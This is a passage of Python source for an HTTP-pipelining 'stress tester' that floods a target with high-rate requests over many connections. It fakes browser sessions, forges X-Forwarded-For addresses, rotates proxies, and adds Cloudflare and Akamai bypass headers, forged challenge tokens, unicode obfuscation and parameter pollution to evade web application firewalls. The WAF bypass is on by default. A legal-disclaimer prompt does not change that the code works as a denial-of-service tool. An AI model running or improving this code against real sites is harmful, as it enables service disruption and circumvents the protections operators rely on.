                            continue
                return False
        
        return False
    
    async def monitor_and_balance(self):
        """Monitor pipelines and dynamically rebalance"""
        print(f"{C}[*]{W} Starting pipeline monitor and load balancer")
        
        monitor_interval = 3.0
        last_health_check = time.time()
        
        while not self.stop_monitor:
            try:
                current_time = time.time()
                
                # Update weights periodically
                if current_time - last_health_check >= monitor_interval:
                    self._update_weights()
                    last_health_check = current_time
                    
                    # Log health status
                    healthy_count = sum(1 for p in self.pipelines if p.is_healthy())
                    total_count = len(self.pipelines)
                    
                    if healthy_count < total_count * 0.7:
                        print(f"{Y}[!]{W} Pipeline health: {healthy_count}/{total_count} healthy")
                
                # Adaptive configuration adjustment
                stats = self.get_stats()
                current_rps = stats.get('requests_per_second', 0)
                
                # Adjust batch size based on RPS
                if current_rps > 1000:
                    self.adaptive_config['batch_size'] = min(10, BATCH_SIZE * 2)
                elif current_rps < 100:
                    self.adaptive_config['batch_size'] = max(2, BATCH_SIZE // 2)
                
                await asyncio.sleep(1.0)
                
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"{R}[-]{W} Monitor error: {e}")
                await asyncio.sleep(monitor_interval)
        
        print(f"{C}[*]{W} Pipeline monitor stopped")
    
    async def health_monitor(self):
        """Monitor pipeline health and perform maintenance"""
        print(f"{C}[*]{W} Starting pipeline health monitor")
        
        while not self.stop_monitor:
            try:
                for i, pipeline in enumerate(self.pipelines):
                    if not pipeline:
                        continue
                    
                    stats = pipeline.get_stats()
                    
                    # Check for unhealthy pipelines
                    if not pipeline.is_healthy():
                        print(f"{Y}[!]{W} Pipeline {pipeline.connection_id} is unhealthy (score: {stats['health_score']:.1f})")
                        
                        # Attempt recovery
                        if stats['health_score'] < 30:
                            print(f"{C}[*]{W} Attempting to recover pipeline {pipeline.connection_id}")
                            success = await pipeline.reconnect()
                            
                            if not success:
                                # Replace with new pipeline
                                print(f"{Y}[!]{W} Replacing failed pipeline {pipeline.connection_id}")
                                
                                # Get proxy config if available
                                proxy_config = None
                                if self.proxy_rotator:
                                    proxy_config = self.proxy_rotator.get_next_proxy()
                                
                                new_pipeline = SmartPipelineConnection(
                                    self.target_host,
                                    self.target_port,
                                    self.use_ssl,
                                    connection_id=f"P{len(self.pipelines)+1:03d}",
                                    bypass_waf=self.bypass_waf,
                                    proxy_config=proxy_config
                                )
                                
                                if await new_pipeline.connect(self.pipeline_timeout):
                                    # Close old pipeline
                                    await pipeline.close()
                                    # Replace in list
                                    self.pipelines[i] = new_pipeline
                                    self.performance_stats['reconnections'] += 1
                                    print(f"{G}[+]{W} Pipeline replaced successfully")
                
                await asyncio.sleep(5.0)
                
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"{R}[-]{W} Health monitor error: {e}")
                await asyncio.sleep(5.0)
    
    def get_stats(self) -> Dict:
        """Get comprehensive manager statistics"""
        if not self.pipelines:
            return {
                'total_pipelines': 0,
                'active_pipelines': 0,
                'healthy_pipelines': 0,
                'total_requests': 0,
                'pipelined_requests': 0,
                'total_responses': 0,
                'success_rate': 0,
                'requests_per_second': 0,
                'bytes_sent': 0,
                'pipelining_efficiency': 0,
                'uptime': time.time() - self.start_time,
                'average_health_score': 0,
                **self.performance_stats
            }
        
        total_requests = 0
        pipelined_requests = 0
        total_bytes = 0
        active_pipelines = 0
        total_responses = 0
        healthy_pipelines = 0
        
        for p in self.pipelines:
            if p:
                stats = p.get_stats()
                total_requests += stats.get('total_requests', 0)
                pipelined_requests += stats.get('pipelined_requests', 0)
                total_bytes += stats.get('bytes_sent', 0)
                total_responses += stats.get('response_count', 0)
                if p.is_connected:
                    active_pipelines += 1
                if p.is_healthy():
                    healthy_pipelines += 1
        
        elapsed = time.time() - self.start_time
        rps = total_requests / elapsed if elapsed > 0 else 0
        
        # Update peak RPS
        if rps > self.performance_stats['peak_rps']:
            self.performance_stats['peak_rps'] = rps
        
        self.performance_stats['total_bytes'] = total_bytes
        
        efficiency = (pipelined_requests / total_requests * 100) if total_requests > 0 else 0
        success_rate = (total_responses / total_requests * 100) if total_requests > 0 else 0
        
        return {
            'total_pipelines': len(self.pipelines),
            'active_pipelines': active_pipelines,
            'healthy_pipelines': healthy_pipelines,
            'total_requests': total_requests,
            'pipelined_requests': pipelined_requests,
            'total_responses': total_responses,
            'success_rate': success_rate,
            'requests_per_second': rps,
            'bytes_sent': total_bytes,
            'pipelining_efficiency': efficiency,
            'uptime': elapsed,
            'average_health_score': sum(p.get_stats().get('health_score', 0) for p in self.pipelines if p) / max(1, len(self.pipelines)),
            **self.performance_stats
        }
    
    async def close_all(self):
        """Close all pipelines gracefully"""
        print(f"{C}[*]{W} Closing all pipeline connections...")
        
        self.stop_monitor = True
        
        # Stop monitoring tasks
        if self.monitor_task and not self.monitor_task.done():
            self.monitor_task.cancel()
            try:
                await self.monitor_task
            except asyncio.CancelledError:
                pass
        
        if self.health_check_task and not self.health_check_task.done():
            self.health_check_task.cancel()
            try:
                await self.health_check_task
            except asyncio.CancelledError:
                pass
        
        # Close all pipelines
        close_tasks = []
        for pipeline in self.pipelines:
            if pipeline:
                close_tasks.append(pipeline.close())
        
        if close_tasks:
            results = await asyncio.gather(*close_tasks, return_exceptions=True)
            failed = sum(1 for r in results if isinstance(r, Exception))
            if failed:
                print(f"{Y}[!]{W} {failed} pipelines failed to close gracefully")
        
        self.pipelines.clear()
        self.pipeline_weights.clear()
        print(f"{G}[+]{W} All pipelines closed")

# ============================================================================
# BEHAVIORAL HEADERS GENERATOR (ENHANCED FOR CLOUDFLARE/AKAMAI BYPASS)
# ============================================================================
class BehavioralHeadersGenerator:
    """Generate realistic behavioral headers with session management and WAF bypass"""
    
    def __init__(self, bypass_waf: bool = False):
        self.bypass_waf = bypass_waf
        
        # Comprehensive user agent database with weights
        self.user_agents = [
            # Chrome on Windows (40%)
            ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 40),
            ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 30),
            
            # Firefox on Windows (20%)
            ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0', 15),
            ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0', 5),
            
            # Safari on macOS (15%)
            ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15', 10),
            ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 5),
            
            # Mobile - iOS (10%)
            ('Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 6),
            ('Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 4),
            
            # Mobile - Android (10%)
            ('Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36', 6),
            ('Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 4),
            
            # Edge (5%)
            ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0', 5),
        ]
        
        self.referers = [
            'https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/',
            'https://www.facebook.com/', 'https://twitter.com/', 'https://www.linkedin.com/',
            'https://www.youtube.com/', 'https://www.amazon.com/', 'https://www.reddit.com/',
            'https://github.com/', 'https://stackoverflow.com/', '',
        ]
        
        self.accept_languages = [
            'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-CA,en;q=0.9', 'en-AU,en;q=0.9',
            'fr-FR,fr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'es-ES,es;q=0.9,en;q=0.8',
            'ja-JP,ja;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8', 'ru-RU,ru;q=0.9,en;q=0.8',
        ]
        
        # Session tracking
        self.sessions = {}
        self.request_counter = 0
        
        # Cache for performance
        self._ua_cache = []
        self._build_ua_cache()
    
    def _build_ua_cache(self):
        """Build weighted user agent cache"""
        for ua, weight in self.user_agents:
            self._ua_cache.extend([ua] * weight)
    
    def generate_headers(self, request_id: int = None, session_id: str = None) -> Dict:
        """Generate realistic behavioral headers with session consistency and WAF bypass"""
        if request_id is None:
            request_id = self.request_counter
            self.request_counter += 1
        
        # Create or get session
        if session_id and session_id in self.sessions:
            session = self.sessions[session_id]
        else:
            session_id = f"sess_{hashlib.md5(str(request_id).encode()).hexdigest()[:8]}"
            session = {
                'user_agent': random.choice(self._ua_cache) if self._ua_cache else self.user_agents[0][0],
                'language': random.choice(self.accept_languages),
                'referer_pattern': random.randint(0, 3),
                'cookie': self._generate_cookie(),
                'last_activity': time.time()
            }
            self.sessions[session_id] = session
        
        # Base headers from session
        headers = {
            'User-Agent': session['user_agent'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': session['language'],
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['max-age=0', 'no-cache', 'no-store']),
        }
        
        # Add referer based on pattern
        if session['referer_pattern'] > 0 and random.random() < 0.7:
            headers['Referer'] = random.choice(self.referers)
        
        # Add cookies (maintain session consistency)
        headers['Cookie'] = session['cookie']
        
        # Add modern security headers (varies by user agent)
        if 'Chrome' in session['user_agent'] or 'Edge' in session['user_agent']:
            headers['Sec-Ch-Ua'] = '"Not_A Brand";v="8", "Chromium";v="120"'
            headers['Sec-Ch-Ua-Mobile'] = '?0'
            headers['Sec-Ch-Ua-Platform'] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
            headers['Sec-Fetch-Dest'] = 'document'
            headers['Sec-Fetch-Mode'] = 'navigate'
            headers['Sec-Fetch-Site'] = random.choice(['none', 'same-origin', 'cross-site'])
            headers['Sec-Fetch-User'] = '?1'
        
        # Add DNT header (varies)
        headers['DNT'] = random.choice(['1', '0'])
        
        # Add timestamp and request ID
        headers['X-Request-ID'] = f'req_{request_id}_{int(time.time() * 1000)}'
        headers['X-Timestamp'] = str(int(time.time() * 1000))
        
        # Add X-Forwarded-For sometimes (simulate proxies)
        if random.random() < 0.3:
            headers['X-Forwarded-For'] = self._generate_ip()
        
        # Add WAF bypass headers if enabled
        if self.bypass_waf:
            headers.update(self._generate_waf_headers())
        
        # Update session activity
        session['last_activity'] = time.time()
        
        return headers
    
    def _generate_waf_headers(self) -> Dict:
        """Generate WAF bypass headers for Cloudflare/Akamai"""
        waf_headers = {}
        
        # Randomly choose between Cloudflare and Akamai headers
        if random.random() < 0.6:
            # Cloudflare headers
            cf_headers = random.choice(CLOUDFLARE_BYPASS_HEADERS)
            for key, value in cf_headers.items():
                if callable(value):
                    waf_headers[key] = value()
                else:
                    waf_headers[key] = value
        else:
            # Akamai headers
            akamai_headers = random.choice(AKAMAI_BYPASS_HEADERS)
            for key, value in akamai_headers.items():
                if callable(value):
                    waf_headers[key] = value()
                else:
                    waf_headers[key] = value
        
        # Add common bypass headers
        if random.random() < 0.3:
            waf_headers['X-Requested-With'] = 'XMLHttpRequest'
        
        if random.random() < 0.2:
            waf_headers['X-CSRF-Token'] = hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
        
        if random.random() < 0.1:
            waf_headers['X-Content-Type-Options'] = 'nosniff'
        
        return waf_headers
    
    def _generate_cookie(self) -> str:
        """Generate random cookie with realistic patterns"""
        cookies = []
        
        # Common cookies
        common_cookies = [
            ('session_id', f'sess_{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}'),
            ('user_id', f'user_{random.randint(10000, 99999)}'),
            ('token', f'tok_{hashlib.md5(str(random.random()).encode()).hexdigest()[:12]}'),
            ('visitor_id', f'vis_{random.randint(1000000, 9999999)}'),
            ('tracking_id', f'trk_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}'),
        ]
        
        # Select 2-4 cookies
        num_cookies = random.randint(2, 4)
        selected = random.sample(common_cookies, num_cookies)
        
        for name, value in selected:
            # Add expiration sometimes
            if random.random() < 0.5:
                expires = time.time() + random.randint(3600, 2592000)
                cookies.append(f'{name}={value}; Expires={expires}')
            else:
                cookies.append(f'{name}={value}')
        
        # Add language preference
        if random.random() < 0.7:
            cookies.append(f'lang={random.choice(["en", "fr", "de", "es", "ja"])}')
        
        return '; '.join(cookies)
    
    def _generate_ip(self) -> str:
        """Generate random IP address"""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    
    def cleanup_sessions(self, max_age: int = 3600):
        """Clean up old sessions"""
        current_time = time.time()
        expired = [sid for sid, sess in self.sessions.items() 
                  if current_time - sess['last_activity'] > max_age]
        
        for sid in expired:
            del self.sessions[sid]
        
        return len(expired)

# ============================================================================
# ENHANCED REQUEST GENERATOR WITH FIREWALL BYPASS
# ============================================================================
class SmartRequestGenerator:
    """Generate smart requests for pipelining with context awareness and WAF bypass"""
    
    def __init__(self, target_host: str, bypass_waf: bool = False):
        self.target_host = target_host
        self.bypass_waf = bypass_waf
        self.request_id = 0
        self.session_tracker = {}
        
        # Path patterns with weights and parameters
        self.path_patterns = {
            'api': [
                ('/api/v1/users', 30),
                ('/api/v2/data', 25),
                ('/graphql', 15),
                ('/api/auth/login', 10),
                ('/api/products', 10),
                ('/api/orders', 10),
                ('/api/search', 15),
                ('/api/notifications', 5),
                ('/api/settings', 5),
                ('/api/health', 3),
                ('/api/metrics', 3),
                ('/api/logs', 3),
            ],
            'web': [
                ('/', 50),
                ('/home', 30),
                ('/index.html', 20),
                ('/about', 15),
                ('/contact', 10),
                ('/products', 20),
                ('/services', 15),
                ('/blog', 15),
                ('/news', 10),
                ('/docs', 10),
                ('/faq', 5),
                ('/support', 5),
                ('/terms', 3),
                ('/privacy', 3),
            ],
            'assets': [
                ('/static/js/app.js', 30),
                ('/css/style.css', 25),
                ('/images/logo.png', 20),
                ('/assets/main.js', 15),
                ('/favicon.ico', 10),
                ('/fonts/roboto.woff2', 10),
                ('/images/banner.jpg', 10),
                ('/videos/intro.mp4', 5),
                ('/downloads/brochure.pdf', 5),
                ('/docs/api.pdf', 5),
            ],
            'admin': [
                ('/admin/', 40),
                ('/admin/dashboard', 30),
                ('/admin/users', 20),
                ('/admin/settings', 15),
                ('/admin/logs', 10),
                ('/admin/backup', 5),
            ],
            'bypass': [
                ('/cdn-cgi/trace', 10),
                ('/cdn-cgi/challenge-platform/h/b/orchestrate/jsch/v1', 5),
                ('/akamai/clear', 5),
                ('/_next/static', 10),
                ('/wp-json/wp/v2', 5),
                ('/api/v3/public', 10),
                ('/healthz', 5),
                ('/readyz', 5),
                ('/livez', 5),
                ('/robots.txt', 10),
                ('/sitemap.xml', 10),
                ('/humans.txt', 5),
            ]
        }
        
        # Query parameters with types
        self.query_params = {
            'cache': ['_', 'v', 't', 'cb', 'rnd', 'ts'],
            'pagination': ['page', 'limit', 'offset', 'start', 'end'],
            'filtering': ['sort', 'filter', 'search', 'q', 'keyword'],
            'ids': ['id', 'user_id', 'post_id', 'item_id', 'uuid']
        }
        
        # HTTP methods with weights and allowed content types
        self.methods = {
            'GET': {'weight': 80, 'can_have_body': False},
            'POST': {'weight': 15, 'can_have_body': True},
            'HEAD': {'weight': 3, 'can_have_body': False},
            'PUT': {'weight': 1, 'can_have_body': True},
            'DELETE': {'weight': 1, 'can_have_body': False}
        }
        
        # Build weighted method list
        self.method_list = []
        for method, config in self.methods.items():
            self.method_list.extend([method] * config['weight'])
        
        # Build weighted path lists
        self._build_weighted_paths()
    
    def _build_weighted_paths(self):
        """Build weighted path lists for each category"""
        self.weighted_paths = {}
        for category, paths in self.path_patterns.items():
            weighted = []
            for path, weight in paths:
                weighted.extend([path] * weight)
            self.weighted_paths[category] = weighted
    
    def generate_request(self, session_id: str = None) -> Tuple[str, str, Dict, Optional[str], str]:
        """Generate a complete HTTP request with session awareness"""
        self.request_id += 1
        
        # Generate or get session ID
        if not session_id:
            session_id = f"sess_{self.request_id % 1000}"
        
        if session_id not in self.session_tracker:
            self.session_tracker[session_id] = {
                'category_weights': {'web': 40, 'api': 30, 'assets': 15, 'admin': 5, 'bypass': 10},
                'last_category': 'web',
                'request_count': 0
            }
        
        session = self.session_tracker[session_id]
        session['request_count'] += 1
        
        # Choose category based on session patterns
        categories = list(session['category_weights'].keys())
        weights = [session['category_weights'][cat] for cat in categories]
        category = random.choices(categories, weights=weights)[0]
        
        # Slight preference to stay in same category
        if random.random() < 0.7:
            category = session['last_category']
        
        session['last_category'] = category
        
        # Choose path from weighted list
        if category in self.weighted_paths and self.weighted_paths[category]:
            base_path = random.choice(self.weighted_paths[category])
        else:
            base_path = '/'
        
        # Add query parameters
        path = self._add_query_params(base_path, category)
        
        # Apply WAF bypass techniques to path
        if self.bypass_waf:
            path = self._apply_waf_bypass(path)
        
        # Choose method
        method = random.choice(self.method_list)
        method_config = self.methods[method]
        
        # Generate headers with session
        header_gen = BehavioralHeadersGenerator(self.bypass_waf)
        headers = header_gen.generate_headers(self.request_id, session_id)
        
        # Add Host header
        headers['Host'] = self.target_host
        
        # Generate body for methods that support it
        body = None
        if method_config['can_have_body'] and random.random() < 0.5:
            body = self._generate_body(method, category)
            if body:
                headers['Content-Type'] = random.choice([
                    'application/x-www-form-urlencoded',
                    'application/json',
                    'multipart/form-data'
                ])
        
        return method, path, headers, body, session_id
    
    def _apply_waf_bypass(self, path: str) -> str:
        """Apply WAF bypass techniques to path"""
        waf_techniques = WAFBypassTechniques()
        
        # Apply Unicode obfuscation to path
        if random.random() < 0.1:
            path = waf_techniques.generate_unicode_obfuscation(path)
        
        # Apply case variations
        if random.random() < 0.05:
            path = waf_techniques.generate_case_variations(path)
        
        return path
    
    def _add_query_params(self, base_path: str, category: str) -> str:
        """Add context-aware query parameters with WAF bypass"""
        # Don't add params if already has them
        if '?' in base_path:
            return base_path
        
        params = {}
        
        # Always add timestamp for cache busting (web and assets)
        if category in ['web', 'assets']:
            params['_'] = str(int(time.time() * 1000) + random.randint(1, 999))
        
        # Add category-specific parameters
        if category == 'api':
            # API parameters
            param_type = random.choice(['pagination', 'filtering', 'ids'])
            num_params = random.randint(1, 3)
        elif category == 'web':
            # Web parameters
            param_type = random.choice(['cache', 'pagination'])
            num_params = random.randint(0, 2)
        elif category == 'bypass':
            # Bypass parameters
            param_type = random.choice(['cache', 'pagination', 'filtering'])
            num_params = random.randint(0, 1)
        else:
            # Other categories
            param_type = random.choice(list(self.query_params.keys()))
            num_params = random.randint(0, 1)
        
        # Add selected parameters
        if param_type in self.query_params and num_params > 0:
            available_params = self.query_params[param_type]
            selected = random.sample(available_params, min(num_params, len(available_params)))
            
            for param in selected:
                params[param] = self._generate_param_value(param, category)
        
        # Add WAF bypass parameters
        if self.bypass_waf and random.random() < 0.3:
            bypass_params = ['__cf_chl_f_tk', '__cf_chl_rt', '_cf_chl_jschl_tk_', '_cf_chl_captcha_tk_']
            for bp in bypass_params:
                if random.random() < 0.2:
                    params[bp] = hashlib.md5(str(time.time()).encode()).hexdigest()[:32]
        
        # Apply WAF bypass techniques to parameter values
        if self.bypass_waf:
            waf_techniques = WAFBypassTechniques()
            for key, value in list(params.items()):
                if random.random() < 0.1:
                    params[key] = waf_techniques.generate_unicode_obfuscation(str(value))
                if random.random() < 0.05:
                    params[f"{key}[]"] = value  # Parameter pollution
        
        # Build query string
        if params:
            query_string = '&'.join(f"{k}={quote(str(v))}" for k, v in params.items())
            return f"{base_path}?{query_string}"
        
        return base_path
    
    def _generate_param_value(self, param: str, category: str) -> str:
        """Generate appropriate value for parameter based on context"""
        if param in ['id', 'user_id', 'post_id', 'item_id']:
            return str(random.randint(1, 10000))
        elif param in ['page', 'limit', 'offset']:
            if param == 'limit':
                return str(random.choice([10, 20, 50, 100]))
            else:
                return str(random.randint(1, 100))
        elif param in ['t', 'ts', '_', 'cb']:
            return str(int(time.time() * 1000))
        elif param == 'sort':
            return random.choice(['asc', 'desc', 'name', 'date', 'price'])
        elif param in ['filter', 'search', 'q', 'keyword']:
            return random.choice(['test', 'query', 'sample', 'demo', 'product', 'user'])
        elif param == 'v':
            return f"{random.randint(1, 5)}.{random.randint(0, 9)}"
        elif param == 'rnd':
            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        else:
            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6))
    
    def _generate_body(self, method: str, category: str) -> str:
        """Generate request body based on method and category"""
        body_types = ['form', 'json', 'xml']
        body_type = random.choice(body_types)
        
        if body_type == 'json':
            if category == 'api':
                data = {
                    'action': random.choice(['create', 'update', 'delete', 'search', 'list']),
                    'timestamp': int(time.time()),
                    'id': random.randint(1000, 9999),
                    'data': {
                        'field1': f'value_{random.randint(1, 100)}',
                        'field2': random.randint(1, 1000),
                        'enabled': random.choice([True, False])
                    }
                }
            else:
                data = {
                    'username': f'user{random.randint(1, 1000)}',
                    'email': f'test{random.randint(1, 1000)}@example.com',
                    'message': f'Test message {random.randint(1, 100)}'
                }
            
            # Apply WAF bypass techniques to JSON data
            if self.bypass_waf and random.random() < 0.1:
                waf_techniques = WAFBypassTechniques()
                json_str = json.dumps(data, separators=(',', ':'))
                json_str = waf_techniques.generate_unicode_obfuscation(json_str)
                return json_str
            
            return json.dumps(data, separators=(',', ':'))
        
        elif body_type == 'form':
            fields = []
            num_fields = random.randint(1, 5)
            
            field_names = ['username', 'email', 'password', 'title', 'content', 
                          'category', 'tags', 'rating', 'comment', 'file']
            
            for _ in range(num_fields):
                field = random.choice(field_names)
                value = f'test_value_{random.randint(1, 100)}'
                
                # Apply WAF bypass techniques
                if self.bypass_waf and random.random() < 0.1:
                    waf_techniques = WAFBypassTechniques()
                    field = waf_techniques.generate_unicode_obfuscation(field)
                    value = waf_techniques.generate_unicode_obfuscation(value)
                
                fields.append(f"{field}={quote(value)}")
            
            return '&'.join(fields)
        
        else:  # xml
            xml_body = f'<?xml version="1.0"?><request><id>{random.randint(1, 1000)}</id><action>test</action></request>'
            
            # Apply WAF bypass techniques to XML
            if self.bypass_waf and random.random() < 0.1:
                waf_techniques = WAFBypassTechniques()
                xml_body = waf_techniques.generate_unicode_obfuscation(xml_body)
            
            return xml_body

# ============================================================================
# MAIN STRESS TESTER (FIXED VERSION)
# ============================================================================
class PowerfulPipelineStressTester:
    """Main stress tester with intelligent pipelining and adaptive behavior"""
    
    def __init__(self, target: str, duration: int = 60, 
                 pipeline_count: int = 15, pipelining_factor: int = 5,
                 max_workers: int = 10, timeout: int = 10,
                 enable_ssl: bool = True, log_results: bool = True,
                 bypass_cloudflare: bool = True, use_proxies: bool = False):
        
        # Input validation
        if not target:
            raise ValueError("Target URL is required")
        
        if duration < 1 or duration > MAX_DURATION:
            raise ValueError(f"Duration must be between 1 and {MAX_DURATION} seconds")
        
        if pipeline_count < 1 or pipeline_count > MAX_CONCURRENT_CONNECTIONS:
            raise ValueError(f"Pipeline count must be between 1 and {MAX_CONCURRENT_CONNECTIONS}")
        
        self.target = target
        self.duration = min(duration, MAX_DURATION)
        self.pipeline_count = min(pipeline_count, MAX_CONCURRENT_CONNECTIONS)
        self.pipelining_factor = min(max(pipelining_factor, 1), 20)
        self.max_workers = min(max_workers, 50)
        self.timeout = min(max(timeout, 1), 30)
        self.enable_ssl = enable_ssl
        self.log_results = log_results
        self.bypass_cloudflare = bypass_cloudflare
        self.use_proxies = use_proxies
        
        # Parse URL
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self.parsed_url = urlparse(target)
        self.host = self.parsed_url.netloc.split(':')[0]
        
        # Port detection
        if self.parsed_url.port:
            self.port = self.parsed_url.port
        else:
            self.port = 443 if self.parsed_url.scheme == 'https' else 80
        
        # SSL override
        self.use_ssl = self.enable_ssl and (self.parsed_url.scheme == 'https' or self.port == 443)
        self.base_path = self.parsed_url.path if self.parsed_url.path else '/'
        
        # Proxy rotator
        self.proxy_rotator = ProxyRotator() if use_proxies else None
        
        # Components
        self.pipeline_manager = None
        self.request_generator = SmartRequestGenerator(self.host, self.bypass_cloudflare)
        self.header_generator = BehavioralHeadersGenerator(self.bypass_cloudflare)
        
        # Statistics
        self.stats = {
            'requests_queued': 0,
            'requests_sent': 0,
            'successful_responses': 0,
            'failed_responses': 0,
            'bytes_sent': 0,
            'pipelined_batches': 0,
            'effective_rps': 0,
            'peak_rps': 0,
            'start_time': 0,
            'worker_count': 0,
            'total_connections': 0,
            'reconnections': 0,
            'sessions_created': 0,
            'health_check_passed': 0,
            'health_check_failed': 0,
        }
        
        # Control
        self.stop_flag = False
        self.worker_tasks = []
        self.monitor_task = None
        self.stats_task = None
        self.session_cleanup_task = None
        
        # Performance tracking
        self.performance_history = []
        self.error_history = []
        
        # Calculate effective concurrency
        self.effective_concurrency = self.pipeline_count * self.pipelining_factor
        
        # Results storage
        self.test_results = {
            'configuration': {},
            'performance': {},
            'errors': [],
            'recommendations': []
        }
    
    def display_disclaimer(self):
        """Display legal disclaimer"""
        print(f"\n{R}{'='*80}{RS}")
        print(f"{R}⚠️  LEGAL DISCLAIMER & AUTHORIZATION REQUIRED ⚠️{RS}")
        print(f"{R}{'='*80}{RS}")
        print(f"{Y}This tool is for AUTHORIZED SECURITY TESTING ONLY!{RS}")
        print(f"{Y}Use ONLY on systems you OWN or have EXPLICIT WRITTEN PERMISSION to test.{RS}")
        print()
        print(f"{R}UNAUTHORIZED USE IS:{RS}")
        print(f"  • {R}ILLEGAL{RS} in most countries")
        print(f"  • {R}PUNISHABLE{RS} by fines and imprisonment")
        print(f"  • Can result in {R}CIVIL LAWSUITS{RS}")
        print()
        print(f"{G}By using this tool, you AGREE that:{RS}")
        print(f"  • You have {G}proper authorization{RS}")
        print(f"  • You accept {G}all legal responsibility{RS}")
        print(f"  • You will use it {G}ethically and legally{RS}")
        print(f"{R}{'='*80}{RS}")
        
        # Get authorization
        confirm = input(f"\n{Y}Type 'AUTHORIZED' to confirm you have permission: {RS}")
        if confirm != "AUTHORIZED":
            print(f"{R}❌ Access denied. Exiting.{RS}")
            return False
        
        # Get target confirmation
        print(f"\n{Y}Target: {self.target}{RS}")
        confirm_target = input(f"{Y}Is this the correct target? (y/N): {RS}").strip().lower()
        if confirm_target not in ['y', 'yes']:
            print(f"{R}❌ Target confirmation failed. Exiting.{RS}")
            return False
        
        print(f"{G}✅ Authorization and target confirmed.{RS}")
        return True
    
    async def pipeline_worker(self, worker_id: int, requests_per_second: int = 20):
        """Worker that sends requests through pipelines with adaptive rate limiting"""
        print(f"{C}[*]{W} Worker {worker_id} started (target: {requests_per_second} req/s)")
        
        request_interval = 1.0 / requests_per_second if requests_per_second > 0 else 0.05
        last_request_time = 0
        requests_sent = 0
        consecutive_failures = 0
        
        # Worker-specific session
        session_id = f"worker_{worker_id}"
        
        try:
            while not self.stop_flag and requests_sent < 1000000:  # Safety limit
                try:
                    current_time = time.time()
                    
                    # Adaptive rate limiting
                    if consecutive_failures > 5:
                        # Back off on failures
                        await asyncio.sleep(0.5)
                        consecutive_failures = 0
                    
                    # Throttle requests based on RPS target
                    if current_time - last_request_time >= request_interval:
                        # Generate request with session consistency
                        method, path, headers, body, _ = self.request_generator.generate_request(session_id)
                        
                        # Add base path if needed
                        if self.base_path != '/' and not path.startswith(self.base_path):
                            full_path = self.base_path.rstrip('/') + path
                        else:
                            full_path = path
                        
                        # Send through pipeline
                        success = await self.pipeline_manager.send_request(method, full_path, headers, body)
                        
                        if success:
                            self.stats['requests_queued'] += 1
                            requests_sent += 1
                            consecutive_failures = 0
                            
                            # Adaptive rate adjustment
                            if requests_sent % 100 == 0:
                                stats = self.pipeline_manager.get_stats()
                                current_rps = stats.get('requests_per_second', 0)
                                
                                # Increase rate if we're below target and pipelines are healthy
                                if current_rps < requests_per_second * 0.8:
                                    request_interval = max(0.001, request_interval * 0.9)
                                # Decrease rate if we're overwhelming the system
                                elif current_rps > requests_per_second * 1.2:
                                    request_interval = min(1.0, request_interval * 1.1)
                        else:
                            consecutive_failures += 1
                            # Reduce rate on failure
                            request_interval = min(1.0, request_interval * 1.2)
                        
                        last_request_time = current_time
                    
                    # Small sleep to prevent CPU hogging
                    await asyncio.sleep(0.0001)
                    
                except asyncio.CancelledError:
                    print(f"{Y}[!]{W} Worker {worker_id} cancelled")
                    break
                except Exception as e:
                    print(f"{R}[-]{W} Worker {worker_id} error: {e}")
                    consecutive_failures += 1
                    await asyncio.sleep(0.5)
        
        except Exception as e:
            print(f"{R}[-]{W} Worker {worker_id} fatal error: {e}")
        
        print(f"{C}[*]{W} Worker {worker_id} finished ({requests_sent} requests)")
        return requests_sent
    
    async def stats_monitor(self, update_interval: float = 2.0):
        """Monitor and display statistics with performance tracking"""
        print(f"{C}[*]{W} Starting statistics monitor")
        
        last_update = time.time()
        last_request_count = 0
        last_bytes_count = 0
        
        # Performance tracking
        performance_samples = []
        
        try:
            while not self.stop_flag:
                try:
                    current_time = time.time()
                    elapsed = current_time - last_update
                    
                    if elapsed >= update_interval and self.pipeline_manager:
